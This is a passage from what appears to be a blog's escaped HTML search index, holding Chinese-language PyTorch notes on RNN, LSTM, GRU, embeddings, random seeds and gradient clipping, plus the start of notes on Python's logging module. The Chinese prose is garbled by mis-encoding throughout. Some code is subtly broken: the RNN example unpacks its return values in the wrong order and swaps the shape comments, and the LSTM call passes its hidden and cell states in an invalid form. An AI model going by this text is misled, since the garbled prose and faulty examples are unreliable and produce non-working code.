style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;æ˜¯æ¯ä¸ªæ—¶é—´çŠ¶æ€ä¸‹çš„è¾“å…¥ï¼Œè€Œåœ¨pytorchä¸­RNNæ¨¡å‹çš„è¾“å…¥æ˜¯ä¸éœ€è¦å•æ­¥å¤„ç†æ¯ä¸ªæ—¶é—´çŠ¶æ€çš„è¾“å…¥çš„ï¼Œåªéœ€è¦å°†æ•´ä¸ªè¾“å…¥æ•°æ®feedåˆ°æ¨¡å‹ä¸­ï¼Œæ¨¡å‹ä¼šè‡ªåŠ¨å¤„ç†æ¯ä¸ªæ—¶é—´çŠ¶æ€çš„è¾“å…¥ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# æ¨¡å‹çš„è¾“å…¥x_input, h_0; è¾“å‡ºh_t,out

# x_input:[seq len, batch, feature len]
# - seq len è¡¨ç¤ºæ¯ä¸ªå¥å­çš„å•è¯æ•°
# - batch è¡¨ç¤ºå¤šå°‘ä¸ªå¥å­
# - feature len è¡¨ç¤ºæ¯ä¸ªå•è¯çš„åµŒå…¥ç»´åº¦
# h_0:[layer, batch, hidden len] h_0å¯ä»¥ä¸ç»™
# - layer RNNçº¿æ€§å±‚æ•°
# - batch 
# - hidden len è¡¨ç¤ºéšå±‚å‘é‡ç»´åº¦

# h_tçš„ç»´åº¦å’Œh_0ä¸€æ ·ï¼Œä»£è¡¨æœ€åä¸€ä¸ªæ—¶é—´èŠ‚ç‚¹çš„éšå±‚çŠ¶æ€
# outï¼š[seq len, batch, hidden len]è¾“å‡ºæ¯ä¸€ä¸ªæ—¶é—´èŠ‚ç‚¹çš„æœ€åä¸€å±‚çš„éšå±‚çŠ¶æ€
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;10&#34;&gt;&lt;img src=&#34;https://cactusii.github.io//post-images/1657554637513.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ä½¿ç”¨ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;rnn = torch.nn.RNN(input_size=100, hidden_size=20, num_layers=2, batch_first=False)

x_input = torch.randn(5, 3, 100) # seq len, batch, feature len
h_0 = torch.randn(2, 3, 20) # layer len, batch, hidden len

h_n, out = rnn(x_input, h_0)

print(h_n.shape)  # torch.Size([5, 3, 20])
print(out.shape)  # torch.Size([2, 3, 20])
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;lstm&#34;&gt;LSTM&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.nn.LSTM(input_size, hidden_size, num_layers, bidirectional=False)

# - input_size: The number of expected features in the input x
# - hidden_size: The number of features in the hidden state h
# - bidirectional: åŒå‘LSTMï¼Œé»˜è®¤ä¸ºFalse

# æ¨¡å‹çš„è¾“å…¥
# x_input [seq len, batch, H_in] H_in=input_size
# h_0 [D*num_layers, batch, H_out] åŒå‘D=2ï¼Œå•å‘D=1ï¼›H_out=hidden_size
# c_0 [D*num_layers, batch, H_cell] H_cell=hidden_size

# æ¨¡å‹çš„è¾“å‡º
# output [seq len, batch, D*H_out]
# h_n [D*num_layers, batch, H_out]
# c_n [D*num_layers, batch, H_cell]

# ç¤ºä¾‹
rnn = nn.LSTM(input_size=10, hidden_size=20, num_layers=2)
x_input = torch.randn(5, 3, 10) # seq len, batch, input_size
h_0 = torch.randn(2, 3, 20) # 1*num_layers, batch, hidden_size
c_0 = torch.randn(2, 3, 20) # 1*num_layers, batch, hidden_size
output, (h_n, c_n) = rnn(x_input, h_0, c_0)
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;gru&#34;&gt;GRU&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.nn.GRU(input_size, hidden_size, num_layers, bidirectional=False)

# - input_size: The number of expected features in the input x
# - hidden_size: The number of features in the hidden state h
# - bidirectional: åŒå‘GRUï¼Œé»˜è®¤ä¸ºFalse

# æ¨¡å‹çš„è¾“å…¥
# x_input [seq len, batch, H_in] H_in=input_size
# h_0 [D*num_layers, batch, H_out] åŒå‘D=2ï¼Œå•å‘D=1ï¼›H_out=hidden_size

# æ¨¡å‹çš„è¾“å‡º
# output [seq len, batch, D*H_out]
# h_n [D*num_layers, batch, H_out]

# ç¤ºä¾‹
rnn = nn.GRU(input_size=10, hidden_size=20, num_layers=2)
x_input = torch.randn(5, 3, 10) # seq len, batch, input_size
h_0 = torch.randn(2, 3, 20) # 1*num_layers, batch, hidden_size
output, h_n = rnn(x_input, h_0)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;12-è¯åµŒå…¥&#34;&gt;12. è¯åµŒå…¥&lt;/h3&gt;
&lt;h4 id=&#34;121-torchnnembedding&#34;&gt;12.1 torch.nn.Embedding&lt;/h4&gt;
&lt;p&gt;åœ¨torchä¸­ä½¿ç”¨åµŒå…¥æ¨¡å‹éå¸¸ç®€å•ï¼Œæ˜¯éœ€è¦ä½¿ç”¨&lt;code&gt;torch.nn.Embedding(num_embeddings, embedding_dim)&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;num_embeddings&lt;/strong&gt; [int]â€“ size of the dictionary of embeddings&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;embedding_dim&lt;/strong&gt; [int] â€“ the size of each embedding vector&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;padding_idx&lt;/strong&gt; [int] - ç´¢å¼•ä¸ºpadding_idxçš„è¯å‘é‡å…¨éƒ¨ä¸º0ï¼ŒæŠŠpadding_idxè®¾ç½®ä¸ºå¡«å……çš„å€¼ï¼Œå¦‚padding_idx=3ï¼Œè®­ç»ƒè¿‡ç¨‹ä¸­ç´¢å¼•ä¸º3çš„å°†å§‹ç»ˆè®¾ç½®ä¸º0ï¼Œä¸è¿›è¡Œå‚æ•°æ›´æ–°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ºäº†ä¾¿äºæ¨¡å‹è®­ç»ƒéœ€ç»Ÿä¸€å¥å­é•¿åº¦ï¼Œå¯¹é‚£äº›å¥å­é•¿åº¦ä¸å¤Ÿçš„å¥å­è¿›è¡Œå¡«å……ï¼Œæ¯”å¦‚ç”¨å€¼3è¿›è¡Œå¡«å……ï¼Œå½“ç”¨nn.Embedding()è¿›è¡Œè¯å‘é‡åµŒå…¥æ—¶ï¼Œå¯¹åº”çš„ç´¢å¼•ä¸º3çš„å‘é‡å°†å˜ä¸ºå…¨ä¸º0çš„å‘é‡ã€‚è¿™æ ·å°±å‡å°‘äº†å¡«å……å€¼å¯¹æ¨¡å‹è®­ç»ƒçš„å½±å“ã€‚ä¾‹å¦‚ï¼šå¥å­[2, 4, 5]å’Œ[1, 2, 7, 8, 9]ï¼Œä¸¤ä¸ªå¥å­ä¸ä¸€æ ·é•¿ï¼Œé‚£ä¹ˆåœ¨è¾“å…¥åˆ°æ¨¡å‹çš„æ—¶å€™å°±å¯ä»¥è½¬æ¢ä¸º[2, 4, 5, 3, 3], [1, 2, 7, 8, 9]ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;Embedding&lt;/code&gt;åˆ›å»ºä¸€ä¸ªå¤§çš„çŸ©é˜µï¼ŒçŸ©é˜µçš„æ¯ä¸€è¡Œä»£è¡¨ä¸€ä¸ªå•è¯ï¼Œé»˜è®¤æ˜¯éšæœºåˆå§‹åŒ–çš„ã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;# æ•´ä¸ªå­—å…¸ä¸€å…±æœ‰5ä¸ªå•è¯ï¼Œæ¯ä¸ªå•è¯å‘é‡çš„ç»´åº¦æ˜¯20
embeds = torch.nn.Embedding(num_embeddings=5, embedding_dim=20)

# è¯»å–ä¸€ä¸ªè¯å‘é‡ï¼Œoutput = embeds(input)
# - input: IntTensoræˆ–LongTensorçš„ä»»æ„shape
# - output: (*, H),*ä»£è¡¨inputçš„shapeï¼ŒH=embeding_dim
input = torch.IntTensor([[0, 1, 2], [3, 4, 1]])  # torch.Size([2, 3])

output = embeds(input)
print(output.shape)  # torch.Size([2, 3, 20])
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸€èˆ¬åœ¨NLPä¸­åˆ›å»ºEmbeddingå­—å…¸æ”¾åœ¨ç½‘ç»œæ¨¡å‹ä¹‹å‰ï¼Œä½œä¸ºé¢„å¤„ç†ï¼Œè¿™äº›embeddingé»˜è®¤æ˜¯éšæœºåˆå§‹åŒ–çš„ï¼Œä½†åœ¨è®­ç»ƒçš„è¿‡ç¨‹ä¸­ä¼šè¿›è¡Œè®­ç»ƒã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥å¯¼å…¥å·²ç»è®­ç»ƒå¥½çš„è¯å‘é‡ï¼Œä½†æ˜¯éœ€è¦è®¾ç½®è®­ç»ƒè¿‡ç¨‹ä¸­ä¸æ›´æ–°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;embeds.weight = torch.nn.Parameter(emb)
# å›ºå®šembedding
embeds.weight.requires_grad = False
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;13-attention&#34;&gt;13. Attention&lt;/h3&gt;
&lt;h3 id=&#34;14-å…¶ä»–å¸¸è§æ“ä½œ&#34;&gt;14. å…¶ä»–å¸¸è§æ“ä½œ&lt;/h3&gt;
&lt;h4 id=&#34;141-æ‰å¹³åŒ–æ“ä½œ&#34;&gt;14.1 æ‰å¹³åŒ–æ“ä½œ&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class Flatten(nn.Module):
    def __init__(self):
        super(Flatten, self).__init__()
        
    def forward(self, input):
        return input.view(input.size(0), -1)
    
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;142-torchmanual_seed&#34;&gt;14.2 torch.manual_seed()&lt;/h4&gt;
&lt;p&gt;åœ¨ä¸€ä¸ªå®éªŒä¸­ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨åˆ°éšæœºæ•°ï¼Œç”±äºæ¯æ¬¡å®éªŒéƒ½éœ€è¦ç”Ÿæˆæ•°æ®ï¼Œè®¾ç½®éšæœºç§å­æ˜¯ä¸ºäº†ç¡®ä¿&lt;strong&gt;æ¯æ¬¡ç”Ÿæˆå›ºå®šçš„éšæœºæ•°ï¼ˆç”Ÿæˆçš„éšæœºæ•°æ˜¯ä¸€æ ·çš„ï¼‰&lt;/strong&gt;ï¼Œè¿™å°±ä½¿å¾—&lt;strong&gt;æ¯æ¬¡å®éªŒç»“æœæ˜¾ç¤ºä¸€è‡´äº†&lt;/strong&gt;ï¼Œæœ‰åˆ©äºå®éªŒçš„æ¯”è¾ƒå’Œæ”¹è¿›ã€‚ä½¿å¾—æ¯æ¬¡è¿è¡Œè¯¥ pythonæ–‡ä»¶æ—¶ç”Ÿæˆçš„éšæœºæ•°ç›¸åŒã€‚&lt;/p&gt;
&lt;p&gt;ç”¨æ¯”è¾ƒå­¦æœ¯çš„è¯æ¥è®²ï¼Œtorch.manual_seed()ä¸º &lt;strong&gt;CPU/GPU&lt;/strong&gt; ä¸­è®¾ç½®ç§å­ï¼Œç”Ÿæˆéšæœºæ•°ã€‚&lt;/p&gt;
&lt;p&gt;ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;t.manual_seed(1000)

def get_fake_data(batch_size=8):
    &#39;&#39;&#39;äº§ç”Ÿéšæœºæ•°æ®ï¼šy= x*2+3 , åŠ ä¸Šä¸€äº›å™ªå£°&#39;&#39;&#39;
    x = t.rand(batch_size,1)*20
    y = x * 2 +( 1 + t.randn(batch_size,1)) * 3
    return x,y

x , y = get_fake_data()
plt.scatter(x.squeeze().numpy(),y.squeeze().numpy())
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;143-æ¢¯åº¦å¼¥æ•£å’Œæ¢¯åº¦çˆ†ç‚¸&#34;&gt;14.3 æ¢¯åº¦å¼¥æ•£å’Œæ¢¯åº¦çˆ†ç‚¸&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;æ¢¯åº¦å¼¥æ•£&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å½“ç½‘ç»œçš„å±‚æ•°éå¸¸æ·±æ—¶ï¼Œä¼šå‡ºç°æ¢¯åº¦éå¸¸å°çš„é—®é¢˜ï¼Œå¯èƒ½ä¼šæ¥è¿‘äº0ï¼Œè¿™æ ·ç½‘ç»œå¯èƒ½é•¿æ—¶é—´å¾—ä¸åˆ°æ›´æ–°ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æ¢¯åº¦çˆ†ç‚¸&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœæ¢¯åº¦åœ¨æŸä¸ªè¿‡ç¨‹ä¸­è®¡ç®—çš„å€¼å¾ˆå¤§ï¼Œå†ç»å†ä¸€ç³»åˆ—çš„ä¹˜æ–¹ä¼šå‡ºç°æ¢¯åº¦éå¸¸å¤§çš„æƒ…å†µï¼Œå› æ­¤éœ€è¦å†è®¡ç®—çš„è¿‡ç¨‹ä¸­æ£€æŸ¥æ¢¯åº¦æ˜¯å¦å¤§äºè‡ªå®šä¹‰çš„é˜ˆå€¼ï¼Œå°†å…¶é™åˆ¶åœ¨é˜ˆå€¼èŒƒå›´å†…ï¼Œè¿™ä¸ªæ“ä½œç§°ä¸ºGradient Clippingï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;loss = loss_fun(output, y)
model.zero_grad()
loss.backward()
for p in model.parameters():
    torch.nn.utils.clip_grad_norm_(p, 10)  # é™åˆ¶åœ¨10çš„èŒƒå›´å†…
optimizer.step()
&lt;/code&gt;&lt;/pre&gt;
">ã€Pytorchã€‘ä½¿ç”¨ç¬”è®°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://cactusii.github.io/post/python-logging-ku/"" data-c="
          &lt;h3 id=&#34;æ—¥å¿—ç­‰çº§&#34;&gt;æ—¥å¿—ç­‰çº§&lt;/h3&gt;
&lt;p&gt;æ—¥å¿—ç­‰çº§(level)ï¼šDEBUG/INFO/WARNING/ERROR/CRITICAL&lt;/p&gt;
&lt;p&gt;å¼€å‘å’Œéƒ¨ç½²æ—¶å¯ä»¥ä½¿ç”¨DEBUGæˆ–INFOçº§åˆ«çš„æ—¥å¿—è·å–å°½å¯èƒ½è¯¦ç»†çš„æ—¥å¿—ä¿¡æ¯æ¥è¿›è¡Œå¼€å‘å’Œéƒ¨ç½²è°ƒè¯•ï¼›åº”ç”¨ä¸Šçº¿æˆ–éƒ¨ç½²ç”Ÿäº§ç¯å¢ƒï¼Œåº”è¯¥ä½¿ç”¨æ›´é«˜çº§åˆ«çš„æ—¥å¿—æ¥é™ä½æœºå™¨çš„I/Oå‹åŠ›ã€‚&lt;/p&gt;
&lt;h3 id=&#34;ä½¿ç”¨æ–¹å¼&#34;&gt;ä½¿ç”¨æ–¹å¼&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ä½¿ç”¨loggingæä¾›çš„æ¨¡å—çº§åˆ«å‡½æ•°&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨loggingæ—¥å¿—ç³»ç»Ÿçš„å››å¤§ç»„ä»¶&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;æ¨¡å—çº§åˆ«å¸¸ç”¨å‡½æ•°ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;logging.debug()&lt;/code&gt;ã€&lt;code&gt;logging.info()&lt;/code&gt;ã€&lt;code&gt;logging.warning()&lt;/code&gt;ã€&lt;code&gt;logging.error()&lt;/code&gt;ã€&lt;code&gt;logging.critical()&lt;/code&gt;ã€&lt;code&gt;logging.log()&lt;/code&gt;ã€&lt;code&gt;logging.basicConfig()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;è¿™äº›å‡½æ•°å¯ä»¥ç›´æ¥æ‹¿æ¥è°ƒç”¨ï¼Œé»˜è®¤æ˜¯ä½¿ç”¨root loggerè¿›è¡Œæ—¥å¿—è¾“å‡ºï¼Œå…¶ä¸­&lt;code&gt;logging.log()&lt;/code&gt;åˆ›å»ºä¸€æ¡ä¸¥é‡çº§åˆ«çš„æ—¥å¿—ï¼Œ&lt;code&gt;logging.basicConfig()&lt;/code&gt;æ˜¯å¯¹root logger()è¿›è¡Œ&lt;strong&gt;ä¸€æ¬¡æ€§&lt;/strong&gt;(å¤šæ¬¡é…ç½®ä¸ä¼šäº§ç”Ÿä½œç”¨)é…ç½®ï¼ŒåŒ…æ‹¬è¦è®°å½•çš„æ—¥å¿—çº§åˆ«ã€æ—¥å¿—æ ¼å¼ã€æ—¥å¿—è¾“å‡ºä½ç½®ã€æ—¥å¿—æ–‡ä»¶çš„æ‰“å¼€æ¨¡å¼ç­‰ä¿¡æ¯ã€‚&lt;/p&gt;
&lt;p&gt;å¦å¤–ï¼Œæ—¥å¿—å™¨ï¼ˆLoggerï¼‰æ˜¯æœ‰å±‚çº§å…³ç³»çš„ï¼Œä¸Šé¢è°ƒç”¨çš„loggingæ¨¡å—çº§åˆ«çš„å‡½æ•°æ‰€ä½¿ç”¨çš„æ—¥å¿—å™¨æ˜¯RootLoggerç±»çš„å®ä¾‹ï¼Œå…¶åç§°ä¸ºrootï¼Œå®ƒæ˜¯å¤„äºæ—¥å¿—å™¨å±‚çº§å…³ç³»æœ€é¡¶å±‚çš„æ—¥å¿—å™¨ï¼Œä¸”è¯¥å®ä¾‹æ˜¯ä»¥å•ä¾‹æ¨¡å¼å­˜åœ¨çš„ã€‚&lt;/p&gt;
&lt;p&gt;ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import logging

logging.debug(&amp;quot;This is a debug log.&amp;quot;)
logging.info(&amp;quot;This is a info log.&amp;quot;)
logging.warning(&amp;quot;This is a warning log.&amp;quot;)
logging.error(&amp;quot;This is a error log.&amp;quot;)
logging.critical(&amp;quot;This is a critical log.&amp;quot;)

# é»˜è®¤çš„æ—¥å¿—æ ¼å¼æ˜¯ï¼š
# æ—¥å¿—çº§åˆ«:æ—¥å¿—å™¨åç§°:æ—¥å¿—å†…å®¹
LOG_FORMAT = &amp;quot;%(asctime)s - %(levelname)s - %(message)s&amp;quot;
logging.basicConfig(filename=&#39;my.log&#39;, level=logging.DEBUG, format=LOG_FORMAT)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;formatæ ¼å¼ï¼š&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;å­—æ®µ/å±æ€§åç§°&lt;/th&gt;
&lt;th&gt;ä½¿ç”¨æ ¼å¼&lt;/th&gt;
&lt;th&gt;æè¿°&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;asctime&lt;/td&gt;
&lt;td&gt;%(asctime)s&lt;/td&gt;
&lt;td&gt;æ—¥å¿—äº‹ä»¶å‘ç”Ÿçš„æ—¶é—´â€“äººç±»å¯è¯»æ—¶é—´ï¼Œå¦‚ï¼š2003-07-08 16:49:45,896&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;created&lt;/td&gt;
&lt;td&gt;%(created)f&lt;/td&gt;
&lt;td&gt;æ—¥å¿—äº‹ä»¶å‘ç”Ÿçš„æ—¶é—´â€“æ—¶é—´æˆ³ï¼Œå°±æ˜¯å½“æ—¶è°ƒç”¨time.time()å‡½æ•°è¿”å›çš„å€¼&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;relativeCreated&lt;/td&gt;
&lt;td&gt;%(relativeCreated)d&lt;/td&gt;
&lt;td&gt;æ—¥å¿—äº‹ä»¶å‘ç”Ÿçš„æ—¶é—´ç›¸å¯¹äºloggingæ¨¡å—åŠ è½½æ—¶é—´çš„ç›¸å¯¹æ¯«ç§’æ•°ï¼ˆç›®å‰è¿˜ä¸çŸ¥é“å¹²å˜›ç”¨çš„ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;msecs&lt;/td&gt;
&lt;td&gt;%(msecs)d&lt;/td&gt;
&lt;td&gt;æ—¥å¿—äº‹ä»¶å‘ç”Ÿäº‹ä»¶çš„æ¯«ç§’éƒ¨åˆ†&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;levelname&lt;/td&gt;
&lt;td&gt;%(levelname)s&lt;/td&gt;
&lt;td&gt;è¯¥æ—¥å¿—è®°å½•çš„æ–‡å­—å½¢å¼çš„æ—¥å¿—çº§åˆ«ï¼ˆâ€˜DEBUGâ€™, â€˜INFOâ€™, â€˜WARNINGâ€™, â€˜ERRORâ€™, â€˜CRITICALâ€™ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;levelno&lt;/td&gt;
&lt;td&gt;%(levelno)s&lt;/td&gt;
&lt;td&gt;è¯¥æ—¥å¿—è®°å½•çš„æ•°å­—å½¢å¼çš„æ—¥å¿—çº§åˆ«ï¼ˆ10, 20, 30, 40, 50ï¼‰&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;name&lt;/td&gt;
&lt;td&gt;%(name)s&lt;/td&gt;
&lt;td&gt;æ‰€ä½¿ç”¨çš„æ—¥å¿—å™¨åç§°ï¼Œé»˜è®¤æ˜¯â€™rootâ€™ï¼Œå› ä¸ºé»˜è®¤ä½¿ç”¨çš„æ˜¯ rootLogger&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;message&lt;/td&gt;
&lt;td&gt;%(message)s&lt;/td&gt;
&lt;td&gt;æ—¥å¿—è®°å½•çš„æ–‡æœ¬å†…å®¹ï¼Œé€šè¿‡ &lt;code&gt;msg % args&lt;/code&gt;è®¡ç®—å¾—åˆ°çš„&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;pathname&lt;/td&gt;
&lt;td&gt;%(pathname)s&lt;/td&gt;
&lt;td&gt;è°ƒç”¨æ—¥å¿—è®°å½•å‡½æ•°çš„æºç æ–‡ä»¶çš„å…¨è·¯å¾„&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;filename&lt;/td&gt;
&lt;td&gt;%(filename)s&lt;/td&gt;
&lt;td&gt;pathnameçš„æ–‡ä»¶åéƒ¨åˆ†ï¼ŒåŒ…å«æ–‡ä»¶åç¼€&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;module&lt;/td&gt;
&lt;td&gt;%(module)s&lt;/td&gt;
&lt;td&gt;filenameçš„åç§°éƒ¨åˆ†ï¼Œä¸åŒ…å«åç¼€&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;lineno&lt;/td&gt;
&lt;td&gt;%(lineno)d&lt;/td&gt;
&lt;td&gt;è°ƒç”¨æ—¥å¿—è®°å½•å‡½æ•°çš„æºä»£ç æ‰€åœ¨çš„è¡Œå·&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;funcName&lt;/td&gt;
&lt;td&gt;%(funcName)s&lt;/td&gt;
&lt;td&gt;è°ƒç”¨æ—¥å¿—è®°å½•å‡½æ•°çš„å‡½æ•°å&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;process&lt;/td&gt;
&lt;td&gt;%(process)d&lt;/td&gt;
&lt;td&gt;è¿›ç¨‹ID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;processName&lt;/td&gt;
&lt;td&gt;%(processName)s&lt;/td&gt;
&lt;td&gt;è¿›ç¨‹åç§°ï¼ŒPython 3.1æ–°å¢&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;thread&lt;/td&gt;
&lt;td&gt;%(thread)d&lt;/td&gt;
&lt;td&gt;çº¿ç¨‹ID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;threadName&lt;/td&gt;
&lt;td&gt;%(thread)s&lt;/td&gt;
&lt;td&gt;çº¿ç¨‹åç§°&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;å››å¤§ç»„ä»¶ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ç»„ä»¶åç§°&lt;/th&gt;
&lt;th&gt;å¯¹åº”ç±»å&lt;/th&gt;
&lt;th&gt;åŠŸèƒ½æè¿°&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;æ—¥å¿—å™¨&lt;/td&gt;
&lt;td&gt;Logger&lt;/td&gt;
&lt;td&gt;æä¾›äº†åº”ç”¨ç¨‹åºå¯ä¸€ç›´ä½¿ç”¨çš„æ¥å£&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;å¤„ç†å™¨&lt;/td&gt;
&lt;td&gt;Handler&lt;/td&gt;
&lt;td&gt;å°†loggeråˆ›å»ºçš„æ—¥å¿—è®°å½•å‘é€åˆ°åˆé€‚çš„ç›®çš„è¾“å‡º&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;è¿‡æ»¤å™¨&lt;/td&gt;
&lt;td&gt;Filter&lt;/td&gt;
&lt;td&gt;æä¾›äº†æ›´ç»†ç²’åº¦çš„æ§åˆ¶å·¥å…·æ¥å†³å®šè¾“å‡ºå“ªæ¡æ—¥å¿—è®°å½•ï¼Œä¸¢å¼ƒå“ªæ¡æ—¥å¿—è®°å½•&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;æ ¼å¼å™¨&lt;/td&gt;
&lt;td&gt;Formatter&lt;/td&gt;
&lt;td&gt;å†³å®šæ—¥å¿—è®°å½•çš„æœ€ç»ˆè¾“å‡ºæ ¼å¼&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;å…¶ä¸­&lt;strong&gt;æ—¥å¿—å™¨&lt;/strong&gt;å°±å°†æ—¥å¿—ä¿¡æ¯è¾“å‡ºåˆ°ç›®æ ‡ä½ç½®ï¼Œ&lt;strong&gt;å¤„ç†å™¨&lt;/strong&gt;å°±æ˜¯æŒ‡å®šè¾“å‡ºä½ç½®çš„ï¼Œ&lt;strong&gt;æ—¥å¿—å™¨&lt;/strong&gt;å¯ä»¥è®¾ç½®å¤šä¸ª&lt;strong&gt;å¤„ç†å™¨&lt;/strong&gt;å°†åŒä¸€æ—¥å¿—è¾“å‡ºåˆ°ä¸åŒçš„ä½ç½®ï¼Œæ¯ä¸ª&lt;strong&gt;å¤„ç†å™¨&lt;/strong&gt;éƒ½å¯ä»¥è®¾ç½®è‡ªå·±çš„&lt;strong&gt;è¿‡æ»¤å™¨&lt;/strong&gt;å®ç°æ—¥å¿—è¿‡æ»¤ï¼Œæ¯ä¸ªå¤„ç†å™¨ä¹Ÿå¯ä»¥è®¾ç½®&lt;strong&gt;æ ¼å¼å™¨&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;å³æ—¥å¿—å™¨ï¼ˆloggerï¼‰æ˜¯å…¥å£ï¼ŒçœŸæ­£å¹²æ´»å„¿çš„æ˜¯å¤„ç†å™¨ï¼ˆhandlerï¼‰ï¼Œå¤„ç†å™¨ï¼ˆhandlerï¼‰è¿˜å¯ä»¥é€šè¿‡è¿‡æ»¤å™¨ï¼ˆfilterï¼‰å’Œæ ¼å¼å™¨ï¼ˆformatterï¼‰å¯¹è¦è¾“å‡ºçš„æ—¥å¿—å†…å®¹åšè¿‡æ»¤å’Œæ ¼å¼åŒ–ç­‰å¤„ç†æ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;ç¤ºä¾‹ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import logging
import colorlog

logging.basicConfig(level=logging.ERROR)

my_logger = logging.getLogger(__name__)
my_logger.setLevel(logging.DEBUG)
stream_handler = logging.StreamHandler()
formatter = colorlog.ColoredFormatter(
           &amp;quot;%(log_color)s%(levelname)1.1s %(asctime)s %(reset)s| %(message_log_color)s%(levelname)-8s %(reset)s| %(&amp;quot;
           &amp;quot;log_color)s[%(filename)s%(reset)s:%(log_color)s%(module)s%(reset)s:%(log_color)s%(funcName)s%(&amp;quot;
           &amp;quot;reset)s:%(log_color)s%(&amp;quot;&amp;quot;lineno)d] %(reset)s- %(white)s%(message)s&amp;quot;,
           reset=True,
           log_colors={
              &#39;DEBUG&#39;: &#39;cyan&#39;,
              &#39;INFO&#39;: &#39;green&#39;,
              &#39;WARNING&#39;: &#39;yellow&#39;,
              &#39;ERROR&#39;: &#39;red&#39;,
              &#39;CRITICAL&#39;: &#39;red&#39;,
           },
           secondary_log_colors={
